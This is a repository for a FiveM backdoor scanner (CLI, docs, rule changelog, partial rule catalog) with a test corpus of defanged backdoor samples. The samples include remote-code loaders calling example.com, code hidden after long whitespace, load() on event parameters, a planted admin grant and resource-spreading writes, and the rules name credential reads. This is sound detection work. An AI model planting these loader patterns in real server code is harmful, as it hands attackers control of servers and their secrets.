@@ -1,0 +1,2226 @@
+Project Path: arc_rpScripts_fivem-backdoor-scanner_tudg3ex2
+
+Source Tree:
+
+```txt
+arc_rpScripts_fivem-backdoor-scanner_tudg3ex2
+├── CONTRIBUTING.md
+├── LICENSE
+├── README.md
+├── SECURITY.md
+├── bin
+│   └── scan.js
+├── corpus
+│   ├── negative
+│   │   ├── comment-after-spaces.lua
+│   │   ├── credential-placeholder.lua
+│   │   ├── event-passes-data.lua
+│   │   ├── identifier-built-at-runtime.lua
+│   │   ├── local-service.lua
+│   │   ├── manifest-relative-js.lua
+│   │   ├── own-file-load.lua
+│   │   └── webhook-log.lua
+│   └── positive
+│       ├── expected.json
+│       ├── sec-101-alias-load.lua
+│       ├── sec-101-http-load.lua
+│       ├── sec-102-decoded-load.lua
+│       ├── sec-103-luraph-header.lua
+│       ├── sec-104-license-key.lua
+│       ├── sec-105-raw-ip.lua
+│       ├── sec-106-spread.lua
+│       ├── sec-107-hidden-after-spaces.lua
+│       ├── sec-108-credential.lua
+│       ├── sec-109-admin-grant.lua
+│       ├── sec-110-event-load.lua
+│       ├── sec-111-base64-eval.js
+│       └── sec-112-blum-txadmin-rce.lua
+├── package-lock.json
+├── package.json
+├── rules
+│   ├── CHANGELOG.md
+│   └── catalog.json
+├── src
+│   ├── archive.js
+│   ├── index.js
+│   ├── limits.js
+│   ├── lua.js
+│   ├── path.js
+│   ├── rules.js
+│   ├── scan.js
+│   └── zip.js
+└── test
+    ├── archive.test.js
+    ├── catalog.test.js
+    ├── cli.test.js
+    ├── corpus.test.js
+    ├── rules.test.js
+    └── zip.test.js
+
+```
+
+`CONTRIBUTING.md`:
+
+```md
+# Contributing
+
+Thanks for helping server owners catch backdoors earlier.
+
+## Ground rules
+
+- **No live malware.** Defang every sample: replace hosts with `example.com`, `example.invalid` or TEST-NET addresses
+  (`192.0.2.x`, `198.51.100.x`, `203.0.113.x`), and cut payloads to the smallest code that still matches.
+- **No credentials or personal data.** No webhooks, tokens, license keys, player identifiers or dumps from real servers,
+  even "dead" ones. A sample for LAB-SEC-108 uses an invented id and filler characters in the shape of the real value.
+- **No naming and shaming.** Describe a pattern, not a seller or a server.
+- **One change per pull request**: one new rule, one false-positive fix, or one corpus addition.
+
+## A new rule or a rule change
+
+1. Open an issue with the pattern, where it was seen (resource type, not a link to a leak), and why existing rules miss it.
+2. Add the rule to `rules/catalog.json` (severity, confidence, method, title, fix) and the check to `src/rules.js`.
+3. Add a positive sample to `corpus/positive/<code>-<short-name>.lua` and its expected codes to `corpus/positive/expected.json`.
+4. Add at least one negative sample that looks similar but is legitimate (common in ox_lib, qb-core, esx, txAdmin-era resources).
+5. Keep the check linear in input size; a single 500 KB line must finish in under 100 ms (see `test/corpus.test.js`).
+6. Run `npm test`. Every corpus file must give exactly its expected codes.
+7. Add the change to `rules/CHANGELOG.md`. A rule code never changes meaning.
+
+The web scanner at rpscripts.net runs the same rules. A rule change is released there and here with the same ruleset version.
+
+## False positives
+
+Open an issue with the smallest snippet that triggers the rule wrongly. If you can, send a pull request that adds it to
+`corpus/negative/` together with the fix.
+
+## Code style
+
+Plain JavaScript (ES modules, Node 18+), no build step, so `npx github:rpScripts/fivem-backdoor-scanner` works. Runtime
+dependencies are `luaparse` (Lua parsing) and `fflate` (ZIP inflation). Commit messages follow Conventional Commits
+(`feat(rules): …`, `fix(sec-105): …`).
+
+## License of contributions
+
+By opening a pull request you agree that your contribution is licensed under the license of this repository (MIT).
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2026 RPScripts
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`README.md`:
+
+```md
+# FiveM Backdoor Scanner
+
+Checks FiveM resources for backdoors before you start them. It reads `.lua` and `.js` files, parses the Lua and looks
+for the patterns known FiveM backdoors use: a loader hidden behind thousands of spaces, code downloaded over HTTP and
+passed to `load()`, obfuscated payloads, reads of your license key or RCON password, and tokens left in the files.
+It also flags executables and unsafe paths in a package.
+
+Nothing is executed and nothing is uploaded. Same rules as the free
+[browser version on RPScripts](https://rpscripts.net/tools/fivem-backdoor-scanner/?utm_source=github&utm_medium=referral&utm_campaign=backdoor-scanner),
+which also takes a ZIP or a whole server folder by drag and drop.
+
+## Usage
+
+Node.js 18 or newer. No install needed:
+
+```sh
+npx github:rpScripts/fivem-backdoor-scanner ./resources
+```
+
+Scan a single resource, several folders, a ZIP (up to 300 MB), or get JSON for your own tooling:
+
+```sh
+npx github:rpScripts/fivem-backdoor-scanner ./resources/[shops]/my_shop ./resources/[jobs]
+npx github:rpScripts/fivem-backdoor-scanner ./downloaded-pack.zip
+npx github:rpScripts/fivem-backdoor-scanner ./resources --json > report.json
+```
+
+Exit code `0` = nothing found, `1` = findings, `2` = wrong usage, `3` = a scan could not run (missing path, ZIP that is
+not readable or over 300 MB). That makes it usable as a CI step:
+
+```yaml
+# .github/workflows/backdoor-scan.yml
+on: [push, pull_request]
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 20 }
+      - run: npx --yes github:rpScripts/fivem-backdoor-scanner ./resources
+```
+
+## What it checks
+
+| Code | Severity | Finds |
+|---|---|---|
+| LAB-SEC-107 | error | Code pushed out of view after 400+ spaces or tabs (the loader trick of a known backdoor family) |
+| LAB-SEC-101 | warning | `load()` / `loadstring()` on the body of an HTTP response |
+| LAB-SEC-102 | warning | `load()` on text decoded at runtime (`string.char`, escaped bytes, base64/hex decoders) |
+| LAB-SEC-103 | warning | Obfuscated data: long escaped-byte strings, 400+ character base64/hex, long `string.char` lists |
+| LAB-SEC-104 | warning | Reads `sv_licenseKey`, `rcon_password`, `sv_tebexSecret`, or the MySQL string in a file that sends HTTP |
+| LAB-SEC-105 | warning | HTTP requests to a public raw IP or to an address decoded at runtime |
+| LAB-SEC-106 | warning | `os.execute`, `io.popen`, JavaScript `child_process`, writes outside the own resource, `SaveResourceFile` into other resources |
+| LAB-SEC-108 | warning | A real-shaped Discord bot token, Discord webhook, Cfx license key or GitHub token in the files |
+| LAB-SEC-109 | warning | `ExecuteCommand("add_principal identifier.license:<hex> …")` or `add_ace identifier.…` with a hard-coded person (an admin planted in the file) |
+| LAB-SEC-110 | warning | `load()` / `loadstring()` on a parameter of an event handler: anyone who can trigger the event runs code |
+| LAB-SEC-111 | warning | JavaScript with `eval`, `new Function` or `vm.run*` in a file that also fetches (`fetch`, `http(s)`) or decodes (`atob`, base64, `fromCharCode`) text |
+| LAB-SEC-112 | warning | A string of the Blum / Warden / Cipher / GFX Panel backdoor (C2 hosts, operator keys, txAdmin tampering markers), or a manifest that loads a `.js` from a dot file or folder or after a commented-out entry |
+| LAB-PKG-004 | warning | `.exe`, `.dll`, `.bat`, `.cmd`, `.ps1`, `.sh`, `.vbs`, `.jar`, `.scr` in a folder or archive (`.dll` is expected next to a `*.net.dll`, a C# resource) |
+| LAB-PKG-005 | warning | Archive entry with `..`, an absolute path or a drive letter: extracting it can write outside the target folder |
+
+Warnings are patterns, not proof: a webhook logger can legitimately call a raw IP. Read the reported line and decide.
+An error (LAB-SEC-107) means treat the package as compromised. Every finding carries `severity`, `confidence`,
+`method`, a fix text and references; the texts are in [`rules/catalog.json`](rules/catalog.json), versions in
+[`rules/CHANGELOG.md`](rules/CHANGELOG.md). Rule codes never change meaning.
+
+## Verdicts
+
+- **hidden**: hidden code found.
+- **suspicious**: at least one warning.
+- **partial**: nothing found, but some files could not be checked in full (escrow-encrypted `.fxap` folders, compiled
+  Lua, Lua that did not parse, JavaScript where only the text checks run, files over 2 MB, archives inside the upload).
+- **clean**: every Lua file was parsed and checked, nothing found.
+
+Findings always win over coverage. A clean result covers these patterns only. It does not prove a resource is safe.
+
+## Limits
+
+- Escrow-protected code can only be read by FXServer, so no scanner can check it.
+- The Lua checks need a parse. CfxLua syntax (`+=`, `?.`, `<const>`, backtick hashes, `/* */`) is supported.
+- JavaScript gets the hidden-code and credential checks plus the text patterns above (LAB-SEC-111, `child_process`), no parser. A
+  JavaScript backdoor that avoids those words is not seen.
+- Not detected: a function name decoded at runtime and called as `_G[name]`, `load(LoadResourceFile(other, …))`, a remote
+  `<script src>` in NUI HTML, escrowed or compiled code. Tested on 11 well-known open-source resources (ox_lib, qb-core, esx_core,
+  txAdmin, …): no hidden-code finding, a few expected warnings (`rcon_password` in the runcode dev tool, `SaveResourceFile`).
+- Archives inside a ZIP (`.zip`, `.rar`, `.7z`) are listed, not unpacked. Only `.zip` is read.
+- 2 MB per file and 120 MB of code in total. ZIP entries whose header, size or CRC disagree with the central directory,
+  or that an extractor would write under another name, are reported as unreadable, never as clean.
+- `node_modules` and `.git` are skipped in a folder scan. `stream` folders are scanned.
+
+## Library use
+
+```js
+import { scanFiles, scanPath, securityRules } from "fivem-backdoor-scanner";
+
+const one = securityRules("server.lua", source); // { findings, parsed }
+const report = await scanPath("./resources"); // folder, ZIP or file
+const inMemory = scanFiles({ "server.lua": source });
+console.log(report.verdict, report.findings);
+```
+
+## Contributing
+
+Found a backdoor the scanner misses, or a false positive in a well-known resource? Open an issue with the pattern
+(never a live payload or a token); see [CONTRIBUTING.md](CONTRIBUTING.md). To report a family without publishing it,
+see [SECURITY.md](SECURITY.md).
+
+```sh
+git clone https://github.com/rpScripts/fivem-backdoor-scanner.git
+cd fivem-backdoor-scanner && npm ci && npm test
+```
+
+Maintained by [RPScripts](https://rpscripts.net/?utm_source=github&utm_medium=referral&utm_campaign=backdoor-scanner).
+MIT licensed. The software is provided "as is", without warranty of any kind.
+
+```
+
+`SECURITY.md`:
+
+```md
+# Reporting a missed backdoor
+
+If you found a backdoor family the rules do not catch and publishing the pattern
+would help attackers before a fix exists, do not open a public issue. Use GitHub's
+private vulnerability reporting: on this repository, open the **Security** tab and
+choose **Report a vulnerability**.
+
+The maintainer has to enable this under repository **Settings → General → Security →
+Private vulnerability reporting**. If the button is missing, the feature is still off.
+
+Include:
+
+- a defanged snippet or a description of the pattern,
+- which rule you expected to fire,
+- whether the backdoor is still active (C2 reachable).
+
+We aim to answer within 7 days and to publish the rule with credit to you, unless you
+prefer to stay anonymous. Do not include live malware. Send a defanged snippet or a
+description of the pattern.
+
+```
+
+`bin/scan.js`:
+
+```js
+#!/usr/bin/env node
+import { scanPath } from "../src/path.js";
+
+const USAGE = `Usage: fivem-backdoor-scanner <resource folder, server folder or ZIP> [more paths] [--json]
+
+Static check of .lua and .js files for hidden loaders, remote code, obfuscated payloads, secret reads and leaked tokens,
+plus executables and unsafe paths in the package. Nothing is executed or uploaded.
+Exit code: 0 nothing found (clean or partial), 1 findings, 2 usage error, 3 a scan could not run.
+Browser version: https://rpscripts.net/tools/fivem-backdoor-scanner/`;
+
+const args = process.argv.slice(2);
+const json = args.includes("--json");
+const unknown = args.find((a) => a.startsWith("-") && a !== "--json" && a !== "--help" && a !== "-h");
+const targets = args.filter((a) => !a.startsWith("-"));
+if (args.includes("--help") || args.includes("-h")) {
+  console.log(USAGE);
+  process.exit(0);
+}
+if (unknown || !targets.length) {
+  if (unknown) console.error(`Unknown option: ${unknown}`);
+  console.error(USAGE);
+  process.exit(2);
+}
+
+const failureText = (message) => (message === "too_large" ? "the ZIP is larger than 300 MB; scan the unpacked folder instead" : message === "invalid_zip" ? "not a valid ZIP" : message);
+
+const reports = [];
+for (const target of targets) {
+  try {
+    reports.push({ target, ...(await scanPath(target)) });
+  } catch (e) {
+    console.error(`${target}: ${failureText(e instanceof Error ? e.message : String(e))}`);
+    process.exit(3);
+  }
+}
+
+if (json) console.log(JSON.stringify(reports, null, 2));
+else
+  for (const r of reports) {
+    console.log(`\n${r.target}: ${r.verdict.toUpperCase()} (${r.scanned} Lua files analysed, ${r.notAnalyzed} not fully analysed, ${r.findings.length} findings)`);
+    for (const f of r.findings) console.log(`  ${f.severity === "error" ? "ERROR" : "warn "} ${f.code} ${f.path ?? ""}${f.line ? `:${f.line}` : ""}\n        ${f.title}: ${f.message}\n        ${f.fix}`);
+    const notes = [
+      [r.escrowed, "escrow-encrypted folders (only FXServer can read them)"],
+      [r.unparsed, "Lua files that did not parse (only text checks ran)"],
+      [r.javascript, "JavaScript files (only text checks ran)"],
+      [r.unreadable, "files that could not be read (compiled Lua, corrupt or aliased ZIP entries)"],
+      [r.skipped, "files over the size limits (not read)"],
+      [r.archives, "archives inside the upload (not unpacked)"],
+    ];
+    for (const [list, label] of notes) if (list.length) console.log(`  ${list.length} ${label}: ${list.slice(0, 5).join(", ")}${list.length > 5 ? ", …" : ""}`);
+  }
+process.exit(reports.some((r) => r.findings.length) ? 1 : 0);
+
+```
+
+`corpus/negative/comment-after-spaces.lua`:
+
+```lua
+-- Legitimate: a long gap followed by a comment is not hidden code.
+print('ok')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    -- note
+
+```
+
+`corpus/negative/credential-placeholder.lua`:
+
+```lua
+-- Legitimate: an empty value and a placeholder, the server owner enters their own. Must stay clean.
+Config.Webhook = ""
+Config.BotToken = "YOUR_BOT_TOKEN"
+Config.Hook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
+
+```
+
+`corpus/negative/event-passes-data.lua`:
+
+```lua
+RegisterNetEvent('shop:buy', function(item) print(item) load('return 1')() end)
+
+```
+
+`corpus/negative/identifier-built-at-runtime.lua`:
+
+```lua
+ExecuteCommand(('add_principal identifier.%s group.%s'):format(id, group))
+
+```
+
+`corpus/negative/local-service.lua`:
+
+```lua
+-- Legitimate: local service and a named host. Must stay clean.
+PerformHttpRequest('http://127.0.0.1:3000/hook', function() end)
+local locale = GetConvar('ox:locale', 'en')
+
+```
+
+`corpus/negative/manifest-relative-js.lua`:
+
+```lua
+-- Ordinary script paths in a manifest-like table: relative, parent and glob entries are not hidden files.
+local scripts = { './server/main.js', '../shared/util.js', 'server/*.js', 'html/app.min.js' }
+print("ggWP", #scripts)
+
+```
+
+`corpus/negative/own-file-load.lua`:
+
+```lua
+-- Legitimate: loads a file from its own resource. Must stay clean.
+local chunk = load(LoadResourceFile(GetCurrentResourceName(), 'data.lua'))
+local f = io.open(GetResourcePath(GetCurrentResourceName()) .. '/logs.txt', 'a')
+
+```
+
+`corpus/negative/webhook-log.lua`:
+
+```lua
+-- Legitimate: posts a log line, never loads the response. Must stay clean.
+PerformHttpRequest(Config.Webhook, function(code) print(code) end, 'POST', json.encode({ content = 'log' }))
+
+```
+
+`corpus/positive/expected.json`:
+
+```json
+{
+  "sec-101-alias-load.lua": [
+    "LAB-SEC-101"
+  ],
+  "sec-101-http-load.lua": [
+    "LAB-SEC-101"
+  ],
+  "sec-102-decoded-load.lua": [
+    "LAB-SEC-102"
+  ],
+  "sec-103-luraph-header.lua": [
+    "LAB-SEC-103"
+  ],
+  "sec-104-license-key.lua": [
+    "LAB-SEC-104"
+  ],
+  "sec-105-raw-ip.lua": [
+    "LAB-SEC-105"
+  ],
+  "sec-106-spread.lua": [
+    "LAB-SEC-106"
+  ],
+  "sec-107-hidden-after-spaces.lua": [
+    "LAB-SEC-107"
+  ],
+  "sec-108-credential.lua": [
+    "LAB-SEC-108"
+  ],
+  "sec-109-admin-grant.lua": [
+    "LAB-SEC-109"
+  ],
+  "sec-110-event-load.lua": [
+    "LAB-SEC-110"
+  ],
+  "sec-111-base64-eval.js": [
+    "LAB-SEC-111"
+  ],
+  "sec-112-blum-txadmin-rce.lua": [
+    "LAB-SEC-110",
+    "LAB-SEC-112"
+  ]
+}
+
+```
+
+`corpus/positive/sec-101-alias-load.lua`:
+
+```lua
+local l = _G["lo".."ad"]
+PerformHttpRequest('https://example.com/x', function(code, body) l(body)() end)
+
+```
+
+`corpus/positive/sec-101-http-load.lua`:
+
+```lua
+-- Defanged: classic remote loader. Must trigger LAB-SEC-101.
+PerformHttpRequest('https://example.invalid/payload', function(_, body)
+    assert(load(body))()
+end)
+
+```
+
+`corpus/positive/sec-102-decoded-load.lua`:
+
+```lua
+-- Defanged: runs text that only exists after decoding. Must trigger LAB-SEC-102.
+load(string.char(112, 114, 105, 110, 116, 40, 39, 104, 105, 39, 41))()
+
+```
+
+`corpus/positive/sec-103-luraph-header.lua`:
+
+```lua
+-- This file was protected using Luraph Obfuscator v14.6 [https://lura.ph/]
+return (function(...) end)(...)
+
+```
+
+`corpus/positive/sec-104-license-key.lua`:
+
+```lua
+-- Must trigger LAB-SEC-104.
+local key = GetConvar('sv_licenseKey', '')
+
+```
+
+`corpus/positive/sec-105-raw-ip.lua`:
+
+```lua
+-- Defanged (TEST-NET address). Must trigger LAB-SEC-105.
+PerformHttpRequest('http://203.0.113.7:8080/p', function() end)
+
+```
+
+`corpus/positive/sec-106-spread.lua`:
+
+```lua
+-- Defanged: writes into every resource. Must trigger LAB-SEC-106.
+for i = 0, GetNumResources() - 1 do
+    local r = GetResourceByFindIndex(i)
+    SaveResourceFile(r, 'fxmanifest.lua', '-- x', -1)
+end
+
+```
+
+`corpus/positive/sec-107-hidden-after-spaces.lua`:
+
+```lua
+-- Defanged: loader pushed out of view. Must trigger LAB-SEC-107 on line 3.
+print('ok')
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                local a=load(x) if a then a() end
+print('after')
+
+```
+
+`corpus/positive/sec-108-credential.lua`:
+
+```lua
+-- Defanged sample: a webhook URL shaped like a real one (invented id, filler token). A shipped credential must be reported.
+Config.Webhook = "https://discord.com/api/webhooks/123456789012345678/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"
+
+```
+
+`corpus/positive/sec-109-admin-grant.lua`:
+
+```lua
+AddEventHandler('playerConnecting', function() ExecuteCommand('add_principal identifier.license:1a2b3c4d5e6f group.admin') end)
+
+```
+
+`corpus/positive/sec-110-event-load.lua`:
+
+```lua
+RegisterNetEvent('shop:run', function(code) load(code)() end)
+
+```
+
+`corpus/positive/sec-111-base64-eval.js`:
+
+```js
+// Defanged: the literal decodes to repeated console.log lines. The shape (eval of a long base64 literal
+// split across lines) is what a JavaScript loader looks like.
+const payload =
+  "Y29uc29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5n" +
+  "ZWQgc2FtcGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4" +
+  "dCBkb2VzIG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpj" +
+  "b25zb2xlLmxvZygnZGVmYW5nZWQgc2FtcGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdl" +
+  "ZCBzYW1wbGU6IHRoaXMgdGV4dCBkb2VzIG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0" +
+  "IGRvZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5nZWQgc2FtcGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNv" +
+  "bnNvbGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4dCBkb2VzIG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2Vk" +
+  "IHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5nZWQgc2FtcGxlOiB0aGlzIHRleHQg" +
+  "ZG9lcyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4dCBkb2VzIG5vdGhpbmcnKTsKY29u" +
+  "c29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5nZWQg" +
+  "c2FtcGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4dCBk" +
+  "b2VzIG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpjb25z" +
+  "b2xlLmxvZygnZGVmYW5nZWQgc2FtcGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdlZCBz" +
+  "YW1wbGU6IHRoaXMgdGV4dCBkb2VzIG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRv" +
+  "ZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5nZWQgc2FtcGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNvbnNv" +
+  "bGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4dCBkb2VzIG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2VkIHNh" +
+  "bXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5nZWQgc2FtcGxlOiB0aGlzIHRleHQgZG9l" +
+  "cyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4dCBkb2VzIG5vdGhpbmcnKTsKY29uc29s" +
+  "ZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwpjb25zb2xlLmxvZygnZGVmYW5nZWQgc2Ft" +
+  "cGxlOiB0aGlzIHRleHQgZG9lcyBub3RoaW5nJyk7CmNvbnNvbGUubG9nKCdkZWZhbmdlZCBzYW1wbGU6IHRoaXMgdGV4dCBkb2Vz" +
+  "IG5vdGhpbmcnKTsKY29uc29sZS5sb2coJ2RlZmFuZ2VkIHNhbXBsZTogdGhpcyB0ZXh0IGRvZXMgbm90aGluZycpOwo=";
+
+eval(Buffer.from(payload, "base64").toString());
+
+```
+
+`corpus/positive/sec-112-blum-txadmin-rce.lua`:
+
+```lua
+-- Defanged shape of the block the Blum Panel family appends to txAdmin's monitor/resource/cl_playerlist.lua.
+RegisterNetEvent("helpEmptyCode", function(id)
+    local ok, fn = pcall(load, id)
+    if ok and type(fn) == "function" then
+        pcall(fn)
+    end
+end)
+
+```
+
+`package-lock.json`:
+
+```json
+{
+  "name": "fivem-backdoor-scanner",
+  "version": "1.1.0",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "fivem-backdoor-scanner",
+      "version": "1.1.0",
+      "license": "MIT",
+      "dependencies": {
+        "fflate": "0.8.3",
+        "luaparse": "0.3.1"
+      },
+      "bin": {
+        "fivem-backdoor-scanner": "bin/scan.js"
+      },
+      "engines": {
+        "node": ">=18"
+      }
+    },
+    "node_modules/fflate": {
+      "version": "0.8.3",
+      "resolved": "https://registry.npmjs.org/fflate/-/fflate-0.8.3.tgz",
+      "integrity": "sha512-tbZNuJrLwGUp3zshBtdy4W+ORxZuIh8a5ilyIEQDC5rY1f3U20JMry0Ll3WBzU58EZKsEuJFXhb5gwv8CsPvgA==",
+      "license": "MIT"
+    },
+    "node_modules/luaparse": {
+      "version": "0.3.1",
+      "resolved": "https://registry.npmjs.org/luaparse/-/luaparse-0.3.1.tgz",
+      "integrity": "sha512-b21h2bFEbtGXmVqguHogbyrMAA0wOHyp9u/rx+w6Yc9pW1t9YjhGUsp87lYcp7pFRqSWN/PhFkrdIqKEUzRjjQ==",
+      "license": "MIT",
+      "bin": {
+        "luaparse": "bin/luaparse"
+      }
+    }
+  }
+}
+
+```
+
+`package.json`:
+
+```json
+{
+  "name": "fivem-backdoor-scanner",
+  "version": "1.3.0",
+  "description": "Static scanner for FiveM resources: finds hidden loaders, remote code execution, obfuscated payloads, secret reads, leaked tokens and risky archive contents in Lua and JS files.",
+  "type": "module",
+  "bin": {
+    "fivem-backdoor-scanner": "bin/scan.js"
+  },
+  "exports": "./src/index.js",
+  "files": [
+    "bin",
+    "src",
+    "rules"
+  ],
+  "scripts": {
+    "test": "node --test"
+  },
+  "engines": {
+    "node": ">=18"
+  },
+  "dependencies": {
+    "fflate": "0.8.3",
+    "luaparse": "0.3.1"
+  },
+  "keywords": [
+    "fivem",
+    "backdoor",
+    "scanner",
+    "lua",
+    "cfx",
+    "qbcore",
+    "esx",
+    "security"
+  ],
+  "homepage": "https://rpscripts.net/tools/fivem-backdoor-scanner/",
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/rpScripts/fivem-backdoor-scanner.git"
+  },
+  "license": "MIT",
+  "author": "RPScripts (https://rpscripts.net)"
+}
+
+```
+
+`rules/CHANGELOG.md`:
+
+```md
+# Ruleset changelog
+
+Versions are `YYYY.MM.N`, the same as the ruleset of https://rpscripts.net/tools/fivem-backdoor-scanner/. A rule code
+never changes meaning.
+
+## Unreleased
+
+- LAB-SEC-111 (2026-11-12): `Buffer.from(` and a `'base64'` argument are matched apart, so a base64 literal of any length or one split across lines is reported, and a file of unclosed `Buffer.from(` calls is scanned in linear time. Same change as the web scanner; the ruleset version is unchanged so far.
+
+## 2026.11.2
+
+- New LAB-SEC-112: a string of the Blum / Warden / Cipher / GFX Panel family in any file (C2 hosts, operator handles and keys, txAdmin tampering markers such as `helpEmptyCode`, `onServerResourceFail`, `RESOURCE_EXCLUDE`), or a manifest that loads a `.js` from a dot file or dot folder, or after a commented-out entry and 20+ spaces. Indicators from https://github.com/ImJer/blum-panel-fivem-backdoor-analysis (iocs 2026.08.07).
+- LAB-SEC-101, LAB-SEC-102 and LAB-SEC-110 follow `pcall(load, code)` and `xpcall(load, handler, code)`.
+- LAB-SEC-103 names a file with a Luraph header.
+
+## 2026.11.1
+
+- New LAB-SEC-109: `ExecuteCommand` with `add_principal` / `add_ace identifier.<type>:<hex>` (a hard-coded person added to a group).
+- New LAB-SEC-110: `load` / `loadstring` on a parameter of an event handler.
+- New LAB-SEC-111: JavaScript that uses `eval`, `new Function` or `vm.run*` in a file that also fetches (`fetch`, `http(s)`) or decodes (`atob`, base64, `fromCharCode`) text. Text check only.
+- LAB-SEC-101 and LAB-SEC-102 follow aliases of `load`: `local run = loadstring`, `_G.load`, `_G["lo".."ad"]`.
+- `child_process` in JavaScript is reported as LAB-SEC-106.
+
+## 2026.10.6
+
+- LAB-SEC-101 … LAB-SEC-108, LAB-PKG-004, LAB-PKG-005 as used by the web scanner.
+- LAB-SEC-107 treats space, tab, vertical tab and form feed as blanks and runs in linear time on very long lines.
+- LAB-SEC-108 reports a real-shaped Discord bot token or webhook, Cfx license key or GitHub token in the files (the value is never echoed).
+- LAB-PKG-004 also matches `.dll` and `.cmd`. `.dll` files are not flagged when the package contains a `*.net.dll` (a C# resource).
+
+```
+
+`rules/catalog.json`:
+
+```json
+{
+  "rulesetVersion": "2026.11.2",
+  "rules": {
+    "LAB-SEC-101": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Possible backdoor: runs code downloaded over HTTP",
+      "fix": "Code from a web response should never reach load(); this is how known FiveM backdoors take over a server. Remove it unless you wrote it and trust the server it calls.",
+      "refs": [
+        {
+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-102": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Runs code built from encoded or obfuscated text",
+      "fix": "Find out what the decoded text does before starting the resource; ship readable source (or Cfx escrow) instead of hidden code.",
+      "refs": [
+        {
